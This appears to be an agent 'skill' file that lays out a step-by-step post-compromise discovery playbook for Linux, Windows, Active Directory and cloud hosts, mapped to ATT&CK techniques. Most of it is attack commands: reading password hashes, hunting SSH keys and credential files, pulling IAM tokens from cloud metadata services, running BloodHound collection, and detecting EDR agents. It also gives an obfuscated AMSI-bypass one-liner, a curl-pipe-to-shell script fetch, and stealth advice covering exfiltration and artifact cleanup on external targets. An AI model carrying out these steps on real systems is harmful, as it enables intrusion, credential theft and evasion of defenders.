---
name: post-access-discovery
description: Systematic enumeration of the compromised system, network, users, and infrastructure immediately after gaining access. First-action skill after landing a shell — everything downstream depends on good discovery.
---

# Post-Access Discovery Skill (TA0007)

## Overview
Systematic enumeration of the compromised system, network, users, and infrastructure immediately
after gaining access. This is the FIRST thing you do after landing a shell — before privilege
escalation, lateral movement, or persistence. Everything downstream depends on good discovery.

## Decision Tree — What to Enumerate First

```
Shell obtained
├── What OS? ──────────────────────────────────────────────────────
│   ├── Linux/Unix ──→ Phase 1L → Phase 2L → Phase 3 → Phase 4L → Phase 5L
│   └── Windows ─────→ Phase 1W → Phase 2W → Phase 3 → Phase 4W → Phase 5W
│                       │
│                       ├── Domain joined? ─→ Phase 6 (AD Enumeration)
│                       └── Standalone? ────→ Skip Phase 6
│
├── Cloud instance? ───→ Phase 7 (Cloud Metadata)
│
└── Access level? ─────────────────────────────────────────────────
    ├── root/SYSTEM ──→ Full enumeration, read shadow, dump SAM
    ├── Admin/sudo ───→ Near-full, may need sudo for some
    └── Unprivileged ─→ Restricted enum, focus on readable files
```

---

## Phase 1: System Context (First 30 Seconds)

**Goal:** Understand WHERE you are, WHO you are, and WHAT you're on.

### Linux
```bash
whoami                          # Current user
id                              # UID, GID, groups
hostname                        # System hostname
uname -a                        # Kernel version, architecture
cat /etc/os-release             # Distribution and version
cat /etc/issue                  # Login banner (may reveal OS)
uptime                          # System uptime
date                            # Current time (timezone awareness)
echo $SHELL                     # Current shell
env                             # Environment variables (may contain creds)
```

### Windows
```cmd
whoami                          :: Current user
whoami /all                     :: User SID, groups, privileges
hostname                        :: System hostname
systeminfo                      :: Full system info (OS, hotfixes, domain)
ipconfig /all                   :: Network config with DNS servers
echo %USERDOMAIN%               :: Domain name
echo %LOGONSERVER%              :: Authenticating DC
set                             :: All environment variables
```

### Windows (PowerShell)
```powershell
[Environment]::UserName
[Environment]::MachineName
Get-ComputerInfo | Select-Object CsName, OsName, OsVersion, OsBuildNumber
$env:USERDOMAIN
$env:LOGONSERVER
```

**Output:** Capture to `discovery.json` — OS, hostname, user, access level, domain status.

---

## Phase 2: User & Account Enumeration (T1087)

**Goal:** Map all users, groups, and identify high-value accounts.

### Linux (T1087.001 — Local Accounts)
```bash
cat /etc/passwd                 # All local users
cat /etc/shadow                 # Password hashes (requires root)
cat /etc/group                  # All groups and members
getent passwd                   # NSS-aware user listing (includes LDAP/NIS)
lastlog                         # Last login for all users
who                             # Currently logged-in users
w                               # Logged-in users with activity
last -20                        # Recent login history
finger -lmsp 2>/dev/null        # User details if finger is installed
cat /etc/sudoers 2>/dev/null    # Sudo rules (if readable)
sudo -l 2>/dev/null             # Current user's sudo permissions
awk -F: '$3 == 0 {print $1}' /etc/passwd  # Users with UID 0 (root equivalents)
```

### Windows (T1087.001, T1087.002 — Local & Domain Accounts)
```cmd
net user                        :: Local users
net localgroup                  :: Local groups
net localgroup administrators   :: Local admin group members
net user /domain                :: Domain users (if domain joined)
net group /domain               :: Domain groups
net group "Domain Admins" /domain  :: Domain admin members
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
net accounts                    :: Password policy
net accounts /domain            :: Domain password policy
```

### Windows (PowerShell/AD)
```powershell
Get-LocalUser | Select-Object Name, Enabled, LastLogon
Get-LocalGroupMember -Group "Administrators"
# Active Directory (requires RSAT or domain context)
Get-ADUser -Filter * -Properties LastLogonDate, Enabled | Select-Object Name, Enabled, LastLogonDate
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName  # Kerberoastable
```

**Output:** Save to `users.json` — all users, groups, privileges, domain admins.
**Reference:** `references/linux_enumeration.md`, `references/windows_enumeration.md`

---

## Phase 3: Network Discovery (T1016, T1049, T1018)

**Goal:** Map network position, adjacent hosts, listening services, connections.

### Linux
```bash
ip a                            # All interfaces and IPs
ip route                        # Routing table
ip neigh                        # ARP table (neighbors)
arp -a                          # Alternative ARP listing
cat /etc/resolv.conf            # DNS servers
cat /etc/hosts                  # Static host mappings
ss -tlnp                        # Listening TCP ports with PIDs
ss -ulnp                        # Listening UDP ports with PIDs
netstat -antp 2>/dev/null       # Active connections (legacy)
cat /etc/network/interfaces 2>/dev/null   # Debian network config
cat /etc/sysconfig/network-scripts/ifcfg-* 2>/dev/null  # RHEL/CentOS
iptables -L -n 2>/dev/null      # Firewall rules (requires root)
```

### Windows
```cmd
ipconfig /all                   :: Full network config
route print                     :: Routing table
arp -a                          :: ARP cache
netstat -ano                    :: All connections with PIDs
netsh firewall show state       :: Legacy firewall state
netsh advfirewall show allprofiles  :: Advanced firewall
nslookup -type=SRV _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%  :: Find DCs via DNS
```

### Internal Network Scanning
```bash
# Ping sweep (no nmap)
for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i &>/dev/null && echo "10.0.0.$i alive") & done; wait

# Nmap ping sweep
nmap -sn 10.0.0.0/24 -oG ping_sweep.gnmap

# Nmap service scan of discovered hosts
nmap -sV -sC -p- -T4 -oA full_scan <targets>

# Quick top-ports scan
nmap -sS --top-ports 100 -T4 10.0.0.0/24 -oG quick_scan.gnmap
```

### DNS Enumeration
```bash
cat /etc/resolv.conf            # DNS servers
dig @<dns_server> <domain> any  # All records
dig @<dns_server> <domain> axfr # Zone transfer attempt
nslookup -type=any <domain> <dns_server>
host -l <domain> <dns_server>   # Zone transfer via host
```

**Output:** Save to `network.json` — IPs, routes, neighbors, connections, open ports.
**Reference:** `references/network_discovery.md`

---

## Phase 4: Service & Software Discovery (T1007, T1518)

**Goal:** Identify running services, installed software, scheduled tasks, and security tools.

### Linux
```bash
ps aux                          # All running processes
ps auxf                         # Process tree
systemctl list-units --type=service --state=running  # Active systemd services
service --status-all 2>/dev/null  # SysV service listing
dpkg -l 2>/dev/null             # Debian/Ubuntu packages
rpm -qa 2>/dev/null             # RHEL/CentOS packages
crontab -l 2>/dev/null          # Current user crontabs
ls -la /etc/cron* 2>/dev/null   # System cron directories
cat /etc/crontab                # System crontab
ls -la /var/spool/cron/crontabs/ 2>/dev/null  # All user crontabs
find / -name "*.timer" -type f 2>/dev/null     # Systemd timers
systemctl list-timers --all     # Active systemd timers
```

### Windows
```cmd
tasklist /svc                   :: Running processes with services
sc query                        :: All services
sc query state= all             :: All services (including stopped)
wmic product get name,version   :: Installed software (slow, WMI-based)
wmic service list config        :: Service details
schtasks /query /fo LIST /v     :: Scheduled tasks (verbose)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  :: Auto-start programs
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  :: User auto-start
```

### Windows (PowerShell)
```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Process | Select-Object Name, Id, Path
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher
```

### Security Software Detection (T1518.001)
```bash
# Linux — check for common EDR/AV agents
ps aux | grep -iE "falcon|crowdstrike|sentinel|carbon|cylance|sophos|eset|clam|osquery|wazuh|auditd"
ls /opt/CrowdStrike/ /opt/carbonblack/ /opt/SentinelOne/ 2>/dev/null
systemctl list-units | grep -iE "falcon|cbd|sentinel|sophos|clam|osquery|wazuh|auditd"
```

```cmd
:: Windows — check for common AV/EDR
tasklist /svc | findstr /i "MsMpEng falcon carbon sentinel cylance sophos symantec mcafee"
sc query windefend
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState
Get-MpComputerStatus   &:: Windows Defender status (PowerShell)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "antivirus security endpoint"
```

**Output:** Save to `services.json` — processes, services, software, security tools.

---

## Phase 5: File & Share Discovery (T1083, T1135)

**Goal:** Find sensitive files, credentials, configuration, and accessible network shares.

### Linux (T1083 — File and Directory Discovery)
```bash
# Configuration files
find / -name "*.conf" -readable 2>/dev/null | head -50
find / -name "*.config" -readable 2>/dev/null | head -50
find /etc -readable -type f 2>/dev/null

# Credential files
find / -name "*.key" -o -name "*.pem" -o -name "id_rsa" -o -name "id_ecdsa" 2>/dev/null
find / -name ".bash_history" -o -name ".mysql_history" 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null

# SUID/SGID binaries (privesc candidates)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World-writable directories/files
find / -writable -type d 2>/dev/null | head -30
find / -writable -type f 2>/dev/null | head -30

# Database files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
```

### Windows (T1083, T1135)
```cmd
dir C:\Users /s /b              :: All user directories
dir /s /b C:\*.txt C:\*.ini C:\*.cfg C:\*.config C:\*.xml 2>nul | findstr /i "password pass cred"
findstr /si password *.txt *.xml *.ini *.cfg *.config
net share                       :: Local shares
net use                         :: Mapped drives
type %USERPROFILE%\.ssh\known_hosts 2>nul
dir %USERPROFILE%\.ssh\ 2>nul
```

### Network Shares (T1135)
```bash
# SMB shares
smbclient -L //<target> -N                     # Null session share listing
smbclient -L //<target> -U '<user>%<pass>'     # Authenticated share listing
crackmapexec smb <target> -u <user> -p <pass> --shares  # CrackMapExec share enum
enum4linux-ng -As <target>                      # Full SMB enumeration

# NFS shares
showmount -e <target>                           # List NFS exports
mount -t nfs <target>:/<share> /mnt/nfs         # Mount NFS share
```

**Output:** Save to `shares.json` — shares, sensitive files, credentials found.
**Reference:** `references/sensitive_file_discovery.md`

---

## Phase 6: Active Directory Enumeration (T1482, T1069)

**Goal:** Map the AD domain — users, groups, trusts, GPOs, ACLs, attack paths.

### BloodHound Collection
```bash
# bloodhound-python (from Linux — LDAP/SMB-based)
bloodhound-python -u '<user>' -p '<pass>' -d <domain> -dc <dc_fqdn> -c all
bloodhound-python -u '<user>' -p '<pass>' -d <domain> -dc <dc_fqdn> -c all --zip
bloodhound-python -u '<user>' -p '<pass>' -d <domain> -dc <dc_fqdn> -c all -ns <dns_server>

# SharpHound (from Windows — .NET-based)
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
.\SharpHound.exe -c All,GPOLocalGroup --domain <domain>
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp -ZipFileName bh.zip
```

### PowerView (PowerShell — from Windows)
```powershell
Import-Module .\PowerView.ps1
Get-DomainController                           # Domain controllers
Get-DomainController -Domain <target_domain>   # Cross-domain DC
Get-Domain                                     # Current domain info
Get-DomainSID                                  # Domain SID
Get-DomainPolicy                               # Domain policies
Get-DomainUser                                 # All domain users
Get-DomainUser -SPN                            # Kerberoastable users
Get-DomainUser -AdminCount                     # Admin users (AdminCount=1)
Get-DomainGroup -Identity "Domain Admins"      # DA group details
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # Recursive DA members
Get-DomainTrust                                # Domain trusts
Get-ForestDomain                               # All domains in forest
Get-DomainComputer -Properties DnsHostName,OperatingSystem  # All computers
Get-DomainGPO | Select-Object DisplayName,Name # All GPOs
Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs   # ACLs on object
Find-InterestingDomainAcl -ResolveGUIDs        # Interesting ACLs
Find-DomainShare -CheckShareAccess             # Accessible shares
```

### ldapsearch (from Linux)
```bash
# Anonymous bind
ldapsearch -x -H ldap://<dc> -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://<dc> -b "dc=domain,dc=local" "(objectClass=group)" cn member

# Authenticated
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName userAccountControl
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" "(memberOf=CN=Domain Admins,CN=Users,dc=domain,dc=local)"
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```

### Trust Enumeration (T1482)
```cmd
nltest /domain_trusts              :: Domain trust list
nltest /domain_trusts /all_trusts  :: All trusts including forest
nltest /dclist:<domain>            :: List DCs for domain
nltest /dsgetdc:<domain>           :: Locate DC for domain
```

```powershell
Get-ADTrust -Filter *                          # AD trust enumeration
Get-ADForest | Select-Object Domains           # All forest domains
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).Domains
```

**Output:** BloodHound ZIP for graph analysis, findings to `discovery.json`.
**Reference:** `references/active_directory_enumeration.md`

---

## Phase 7: Cloud Metadata Enumeration

**Goal:** If running on a cloud instance, extract metadata, IAM roles, tokens, and credentials.

### AWS EC2
```bash
# IMDSv1
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
curl -s http://169.254.169.254/latest/user-data/

# IMDSv2 (token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS CLI (if installed)
aws sts get-caller-identity
aws iam list-users
aws s3 ls
```

### Azure IMDS
```bash
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -m json.tool

# Azure CLI (if installed)
az account show
az ad user list
az storage account list
```

### GCP
```bash
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# GCP CLI (if installed)
gcloud auth list
gcloud projects list
gcloud compute instances list
```

**Reference:** `references/cloud_enumeration.md`

---

## Automated Enumeration Tools

When manual checks are done, deploy comprehensive enumeration scripts:

### Linux
```bash
# LinPEAS — comprehensive Linux enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a | tee linpeas_output.txt       # All checks, save output
./linpeas.sh -a -o /dev/shm/linpeas.txt        # Output to tmpfs

# pspy — process monitoring (unprivileged cron/process snooping)
./pspy64 -pf -i 1000                           # Watch processes + file events every 1s
./pspy64 -r /tmp -r /etc/cron.d                # Watch specific directories
```

### Windows
```powershell
# WinPEAS — comprehensive Windows enumeration
.\winPEASx64.exe                               # Run all checks
.\winPEASx64.exe quiet                         # Less output
.\winPEASx64.exe systeminfo userinfo           # Specific categories

# Seatbelt — targeted host-survey checks
.\Seatbelt.exe -group=all                      # Run all command groups
.\Seatbelt.exe -group=system                   # System checks only
.\Seatbelt.exe -group=user                     # User checks only
.\Seatbelt.exe AntiVirus AppLocker LocalGroups LocalUsers  # Specific checks
.\Seatbelt.exe -group=all -computername=<target> -username=<user> -password=<pass>  # Remote
```

---

## OPSEC Considerations

| Action | Noise Level | Detection Risk | Notes |
|--------|-------------|----------------|-------|
| whoami, id, hostname | Silent | None | Basic OS commands |
| cat /etc/passwd | Silent | None | World-readable file |
| ps aux, netstat | Low | Minimal | Normal admin activity |
| nmap -sn (ping sweep) | Medium | Moderate | Network traffic anomaly |
| nmap -sV -sC | High | High | Port scanning, service probes |
| BloodHound collection | High | High | LDAP queries, SMB enum |
| LinPEAS/WinPEAS | Medium | Moderate | File access patterns |
| Cloud metadata | Silent | Low | Internal HTTP requests |

### Stealth Priorities (External Targets)
1. Start with OS-native commands only (no tools)
2. Avoid network scanning until necessary
3. Rate-limit any scanning activity
4. Use encrypted channels for data exfil
5. Clean up artifacts when done

### Lab Targets — Go Full Speed
In lab environments, run everything: LinPEAS, WinPEAS, BloodHound, nmap full port scan.
Speed matters more than stealth in CTFs and practice labs.

---

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| LinPEAS/WinPEAS | AV/EDR blocks execution | Use manual commands from Phase 1-5, or transfer via base64 encoding |
| BloodHound | LDAP blocked | Use manual ldapsearch, PowerView, or net commands |
| nmap (internal) | Host firewall blocks | Try `-Pn`, use OS-native `ping`/`arp` instead |
| PowerView | AMSI blocks | `sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) )` bypass, or use net.exe commands |
| Process listing | Permission denied | Try `ps aux` as current user, or `/proc` enumeration on Linux |
| Cloud metadata | 404 / timeout | Check if IMDSv2 (needs token), try different API versions |

## Technique Chaining Playbooks

### Linux Post-Access Full Enum
```
1. System context 🟢 (whoami, id, uname -a) — 30 seconds
2. User enumeration 🟢 (/etc/passwd, sudo -l) — 1 minute
3. Network discovery 🟢 (ip a, ss -tlnp, arp -a) — 1 minute
4. Service/software 🟢 (ps aux, dpkg -l) — 1 minute
5. File discovery 🟢 (find SUID, writable, keys) — 2 minutes
6. LinPEAS full 🟡 (automated comprehensive) — 5 minutes
   └── Privesc paths → privilege_escalation skill
   └── Credentials found → credential_access skill
   └── Network targets → lateral_movement skill
```

### Windows Domain Post-Access Enum
```
1. System context 🟢 (whoami /all, systeminfo) — 30 seconds
2. Domain check 🟢 (echo %USERDOMAIN%, nltest) — 30 seconds
3. User/group enum 🟢 (net user /domain, net group) — 1 minute
4. Network mapping 🟢 (ipconfig, netstat, arp) — 1 minute
5. WinPEAS 🟡 — 3 minutes
6. BloodHound 🔴 (if AD) — 5 minutes
   └── DA path → privilege_escalation → lateral_movement
```

## Examples
See [examples/linux-post-access.md](examples/linux-post-access.md) for Linux enumeration output.
See [examples/windows-domain-enum.md](examples/windows-domain-enum.md) for Windows/AD enumeration.
See [examples/bloodhound-collection.md](examples/bloodhound-collection.md) for BloodHound data collection.

---

## Output Files

| File | Contents |
|------|----------|
| `discovery.json` | Master discovery state — OS, hostname, user, domain, access level |
| `users.json` | All users, groups, privileges, domain accounts |
| `network.json` | Interfaces, routes, ARP, connections, open ports |
| `shares.json` | Network shares, mounted drives, accessible paths |
| `services.json` | Running processes, services, installed software, security tools |
| `evidence.json` | Raw command outputs with timestamps |
| `findings.json` | Observations, anomalies, and next-step recommendations |
